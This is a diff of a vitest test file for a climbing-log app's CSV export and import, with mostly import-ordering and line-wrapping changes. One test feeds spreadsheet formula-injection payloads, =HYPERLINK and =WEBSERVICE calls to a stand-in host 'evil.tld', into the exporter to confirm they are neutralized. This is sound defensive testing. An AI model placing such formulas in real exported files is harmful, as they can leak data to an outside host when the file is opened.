@@ -1,4 +1,8 @@
 import { describe, expect, it } from "vitest";
+
+import type { UserSendRow } from "@/db/queries";
+
+import { parseGrade } from "./grades";
 import { buildSendsExportCsv } from "./sends-export";
 import {
   distinctValues,
@@ -9,8 +13,6 @@ import {
   normalizeImportRows,
   parseCsvText,
 } from "./sends-import";
-import { parseGrade } from "./grades";
-import type { UserSendRow } from "@/db/queries";
 
 function row(overrides: Partial<UserSendRow> = {}): UserSendRow {
   return {
@@ -52,7 +54,9 @@ describe("buildSendsExportCsv", () => {
   });
 
   it("capitalizes ascent style and climb type, and formats the grade", () => {
-    const csvText = buildSendsExportCsv([row({ ascentStyle: "flash", climbType: "boulder", climbGrade: 5 })]);
+    const csvText = buildSendsExportCsv([
+      row({ ascentStyle: "flash", climbType: "boulder", climbGrade: 5 }),
+    ]);
     expect(csvText).toContain("Flash");
     expect(csvText).toContain("Boulder");
     expect(csvText).toContain("V4");
@@ -122,12 +126,8 @@ describe("export → import round trip", () => {
     const ascentStyleMapping = guessAscentStyleMapping(
       distinctValues(parsed.rows, mapping.ascentStyle),
     );
-    const climbTypeMapping = guessClimbTypeMapping(
-      distinctValues(parsed.rows, mapping.climbType),
-    );
-    const gradeFeelMapping = guessGradeFeelMapping(
-      distinctValues(parsed.rows, mapping.gradeFeel),
-    );
+    const climbTypeMapping = guessClimbTypeMapping(distinctValues(parsed.rows, mapping.climbType));
+    const gradeFeelMapping = guessGradeFeelMapping(distinctValues(parsed.rows, mapping.gradeFeel));
 
     const { valid, invalid, warnings } = normalizeImportRows(
       parsed,
@@ -204,7 +204,7 @@ describe("buildSendsExportCsv formula escaping", () => {
   it.each([
     ["=1\n+2", "climbName"],
     ['=HYPERLINK("https://evil.tld","x")\n', "areaName"],
-    ["=WEBSERVICE(\"https://evil.tld\")\r\n=1+1", "climbName"],
+    ['=WEBSERVICE("https://evil.tld")\r\n=1+1', "climbName"],
   ])("escapes %j in %s despite an embedded newline", (payload, field) => {
     // Not cellsOf: the payload's own newline would split the row.
     expect(buildSendsExportCsv([row({ [field]: payload })])).toContain(neutralized(payload));
